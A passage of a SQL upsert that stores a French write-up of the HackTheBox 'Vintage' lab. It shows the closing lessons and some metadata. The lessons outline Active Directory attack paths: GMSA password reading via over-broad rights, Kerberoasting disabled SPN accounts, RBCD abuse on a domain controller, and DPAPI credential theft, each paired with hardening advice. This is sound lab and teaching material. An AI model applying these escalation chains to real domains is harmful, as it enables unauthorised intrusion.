1.  **GMSA & Pre-Windows 2000 Compatibility** : L''utilisation du groupe **Pre-Windows 2000 Compatible Access** est un risque majeur. En permettant à des objets anonymes ou faiblement authentifiés de lire des attributs, on expose des vecteurs vers les comptes **GMSA**. Bien que les **GMSA** soient conçus pour la sécurité (mots de passe complexes et gérés), le droit `ReadGMSAPassword` accordé à un groupe trop large annule totalement cette protection.
2.  **Targeted Kerberoasting sur comptes désactivés** : Une erreur courante est de penser qu''un compte désactivé est inoffensif. Tant qu''un **Service Principal Name (SPN)** est présent, le compte peut être **Kerberoasted**. La réactivation via des droits de type `GenericWrite` ou `AccountOperator` permet ensuite d''utiliser le mot de passe cracké.
3.  **Persistance via RBCD** : Le **Resource-Based Constrained Delegation** est souvent moins surveillé que la délégation traditionnelle. Le fait qu''un utilisateur puisse modifier cet attribut sur un **Domain Controller** est une configuration catastrophique. Dans un environnement durci, l''attribut `msDS-AllowedToActOnBehalfOfOtherIdentity` ne devrait jamais être modifiable par un utilisateur standard ou un administrateur de second rang.
4.  **Hygiène DPAPI** : La présence de credentials administratifs dans le **Credential Manager** d''un utilisateur non-admin (**C.Neri**) facilite le mouvement latéral. L''utilisation de **LAPS** (Local Administrator Password Solution) et la restriction des sessions administratives sur les postes de travail auraient pu prévenir cette escalade.',
  'HackTheBox',
  'Medium',
  30,
  ARRAY['Active Directory', 'SMB', 'Kerberos', 'SQL', 'Privilege Escalation'],
  'La phase de reconnaissance commence par un scan **Nmap** exhaustif pour identifier la surface d''attaque de la cible Windows. L''analyse des services confirme la présence d''un **Domain Controller** (DC01) pour le domaine **vintage.htb**. Un point criti...',
  true,
  ARRAY['https://srmwnujqhxaopnffesgl.supabase.co/storage/v1/object/public/writeup-images/htb-vintage-cover.png'],
  now()
) ON CONFLICT (slug) DO UPDATE SET
  title = EXCLUDED.title,
  content = EXCLUDED.content,
  platform = EXCLUDED.platform,
  difficulty = EXCLUDED.difficulty,
  points = EXCLUDED.points,
  tags = EXCLUDED.tags,
  images = COALESCE(EXCLUDED.images, writeups.images),
  description = EXCLUDED.description;

